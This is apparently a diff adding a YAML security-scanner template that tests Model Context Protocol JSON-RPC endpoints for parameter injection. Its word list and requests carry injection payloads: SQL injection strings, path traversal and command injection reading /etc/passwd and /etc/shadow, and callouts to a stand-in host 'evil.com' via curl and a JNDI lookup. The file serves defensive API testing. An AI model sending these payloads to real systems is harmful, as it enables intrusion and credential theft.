@@ -1,0 +1,111 @@
+---
+id: MCP_FUNCTION_CALL_PARAMETER_INJECTION
+info:
+  name: Function Call Manipulation - Parameter Injection (MCP)
+  description: |
+    Tests whether malicious parameters can be injected into function calls to manipulate their behavior or access unauthorized data.
+  details: |
+    According to the Promptfoo MCP Plugin documentation, parameter injection involves "crafting malicious inputs to inject unwanted parameters." This test attempts to inject additional or malicious parameters into function calls that could alter the intended behavior, bypass security controls, or access unauthorized resources.<br>
+    <b>Background:</b> Many MCP tools accept parameters that control their behavior. If these parameters are not properly validated or sanitized, attackers can inject additional parameters, modify existing ones, or use special values to manipulate function execution. This is particularly dangerous when functions interact with databases, file systems, or external APIs.
+  impact: |
+    Successful parameter injection can lead to:
+    1. SQL injection through database query parameters
+    2. Path traversal through file operation parameters
+    3. Command injection through system call parameters
+    4. Authorization bypass by modifying user/role parameters
+    5. Data exfiltration by injecting filter/query parameters
+    6. Business logic bypass through parameter manipulation
+  category:
+    name: MCP_FUNCTION_MANIPULATION
+    shortName: MCP_FUNC_MANIP
+    displayName: Model Context Protocol (MCP) Security - Function Call Manipulation
+  subCategory: MCP_FUNCTION_CALL_PARAMETER_INJECTION
+  severity: HIGH
+  tags:
+  - Parameter Injection
+  - Function Manipulation
+  - Input Validation
+  - MCP
+  - AI/LLM Security
+  references:
+  - https://www.promptfoo.dev/docs/red-team/plugins/mcp/
+  - https://owasp.org/www-project-api-security/
+  - https://cwe.mitre.org/data/definitions/89.html
+  cwe:
+  - CWE-89
+  - CWE-78
+  - CWE-20
+  - CWE-74
+  cve:
+  - CVE-2023-38254
+attributes:
+  nature: INTRUSIVE
+  plan: PRO
+  duration: FAST
+api_selection_filters:
+  method:
+    eq: POST
+  response_code:
+    gte: 200
+    lt: 300
+  request_payload:
+    contains_all:
+    - jsonrpc
+    - method
+    - params
+    for_one:
+      key:
+        contains_either: "$magic From the request body, locate the `params` object. Inside `params`, find the `arguments` object if it exists. Select any parameter key that accepts user input. Return the key name. If not found, return []."
+        extract: paramKey
+      value:
+        extract: paramValue
+wordLists:
+  injectionPayloads:
+  - "'; DROP TABLE users; --"
+  - "1' OR '1'='1"
+  - "../../../etc/passwd"
+  - "$(curl evil.com)"
+  - "`whoami`"
+  - "; cat /etc/shadow #"
+  - "admin' --"
+  - "{{7*7}}"
+  - "${jndi:ldap://evil.com/a}"
+  - "<!--#exec cmd=\"ls\" -->"
+execute:
+  type: multiple
+  requests:
+  # Test 1: SQL injection in parameter
+  - req:
+    - modify_body_param:
+        params.arguments.${paramKey}: "${injectionPayloads}"
+  # Test 2: Add malicious extra parameters
+  - req:
+    - add_body_param:
+        params.arguments.admin: "true"
+    - add_body_param:
+        params.arguments.bypass_auth: "1"
+    - add_body_param:
+        params.arguments.privileged: "true"
+  # Test 3: Inject command execution parameters
+  - req:
+    - modify_body_param:
+        params.arguments.command: "whoami; cat /etc/passwd"
+    - add_body_param:
+        params.arguments.shell: "/bin/bash"
+validate:
+  response_code:
+    gte: 200
+    lt: 300
+  response_payload:
+    not_contains:
+    - Error
+    - error
+    - Invalid parameter
+    - injection detected
+    - malicious input
+    - validation failed
+    - unauthorized
+    - forbidden
+strategy:
+  run_once: /
+
